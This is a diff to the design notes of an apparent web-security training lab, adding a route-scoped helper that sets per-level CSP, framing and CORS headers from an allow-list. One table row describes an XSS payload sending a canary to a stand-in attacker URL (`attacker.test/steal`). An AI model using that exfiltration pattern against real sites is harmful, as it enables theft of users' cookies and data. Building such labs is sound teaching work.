@@ -169,6 +169,7 @@ case (g)). Divine resists every exploit.
 | `newMarker()`, `xssBrowser(world, handler, { marker, canary, interact?, dom? })`, `XSS_STEAL_URL` | `core/xss` (`core/victim.ts`) | XSS labs: the player's marker call per player and level, and the admin's browser whose rendered pages run through the oracle; a payload that runs sends `GET http://attacker.test/steal?c=<canary>` to the attacker log (section 13) |
 | `previewFrame(fragment, { marker?, title?, hash? })` | `core/xss` | the vulnerable fragment, live for the player, inside `<iframe sandbox="allow-scripts" srcdoc>`; the only raw output of an XSS view (section 13) |
 | `xssOracle(html, marker, opts?)`, `linkSinks(html)`, `roundTrip(html)`, `XSS_LIMITS` | `core/xss` | the static oracle itself (sinks, marker, mXSS), the links and resources a mail would load, a sanitizer's fixed-point seam, the bounds (section 13) |
+| `setLabHeaders(res, { csp?, frameAncestors?, xfo?, cors? })`, `labHeaders(h)`, `LabHeaders` | `core/http` | a level's CSP / `X-Frame-Options` / `frame-ancestors` / CORS on its OWN route's response, from an allow-list; `labHeaders` is the same lines as a plain object, for a citadel twin's `SimResponse` (section 4, "Lab headers") |
 
 `req.level` on a challenge route is already clamped to the implemented levels;
 `req.sessionId` and `req.lang` are typed. `res.locals.challenge` and
@@ -358,6 +359,39 @@ says so, and the spec uses `malformed: []` plus an explicit "no database text at
   belongs in `model.ts`.
 - **Fixtures** (wordlists, leaked lists) live in `fixtures/`, are read once with `fixtureLines` and served with
   `sendLines`; the page links them by absolute path.
+
+**Lab headers (route-scoped, `core/http.ts`; owner decision Q4).** The platform sends no CSP, no `X-Frame-Options` and
+no CORS headers, and no lab changes that globally: a lab that needs them (an XSS Divine's CSP, the clickjacking and CORS
+labs' per-level framing and CORS answers) sets them on its OWN response with `setLabHeaders(res, h)`. Nothing else
+changes: not the lab's other routes, not another lab, not the portal, not the platform's own pages (`tests/http.spec.ts`).
+
+```ts
+// levels/divine.ts: the level decides, so View Source and the Diff show it
+export const headers: LabHeaders = { csp: "script-src 'self'; object-src 'none'; base-uri 'none'" };
+// challenge.ts (real route) and model.ts (citadel twin): one decision, both browsers
+setLabHeaders(res, impl.for(req.level).headers ?? {});
+return { status: 200, headers: labHeaders(impl.for(level).headers ?? {}), body };
+```
+
+- **The allow-list** is the whole interface: `csp` (one policy, no comma), `frameAncestors` (its source list, written as
+  that policy's own `frame-ancestors` directive), `xfo` (`'DENY'` or `'SAMEORIGIN'`), and `cors: { allowOrigin?,
+  allowCredentials?, varyOrigin? }` (`Access-Control-Allow-Origin` as the level decided it, a reflected or `null` origin
+  included; `Access-Control-Allow-Credentials: true` only for `true`; `Vary: Origin` added to any `Vary` already set).
+  Any other option, a value of the wrong type or with a control character, or `frame-ancestors` given twice throws: a
+  lab bug, a stack-free 500. `{}` sets nothing, so every level can export a value.
+- **It refuses** a response that is not a lab route (no `res.locals.labPath`), one whose headers are sent, and one that
+  already carries one of its headers (two decisions for one header are never merged or overwritten). A refused call sets
+  nothing.
+- **`labHeaders(h)`** is the same lines as a frozen plain object (wire names, `LAB_HEADER_NAMES`): put them in the
+  citadel twin's `SimResponse`, so the victim's browser gets what the player's does.
+- **A previewFrame inherits the page's CSP** (a srcdoc document takes its parent's policy). A `script-src` without
+  `'unsafe-inline'` therefore blocks the preview's banner shim and every inline payload in it, as a browser would. The
+  platform layout has no inline script or handler (htmx is a file under `/static/`), so `script-src 'self'` leaves the
+  lab bar and the victim panel working.
+- **The XSS oracle evaluates only CSP `sandbox`** (section 13). A policy is defence in depth: a Divine level encodes or
+  sanitizes, and its spec's mutation "encoding removed, CSP kept" must go red.
+- Header-shaped lessons whose bytes are not HTTP-header values (a `<meta>` CSP, a `<meta>` frame option) stay in the
+  level's markup; this helper writes response headers only.
 - **Limiters and lockouts must not be beaten by waiting.** A short window or a short lock turns a brute-force lab
   into "wait and retry" at every level, Divine included. Use long windows or locks (15 min or more) below Divine and
   an escalating per-account lockout at Divine (the fifth failure locks, every further one doubles it, capped), so
@@ -1474,8 +1508,8 @@ Every string kept is a copy.
 - Raw lab input reaches only the preview frame; everything else is escaped. Residual risk, accepted: all labs share
   the loopback origin, so a payload the player pastes into their own address bar or devtools can script their own
   platform page.
-- No route-scoped header helper exists yet (`core/http.ts setLabHeaders` is engine task E1). Until then a Divine
-  level that adds CSP sets the header on its own route only, never globally.
+- A Divine level that adds a CSP sets it on its own route with `setLabHeaders` (section 4, "Lab headers"), never
+  globally, and puts the same lines (`labHeaders`) in its citadel twin's answer.
 
 ### Testing
 
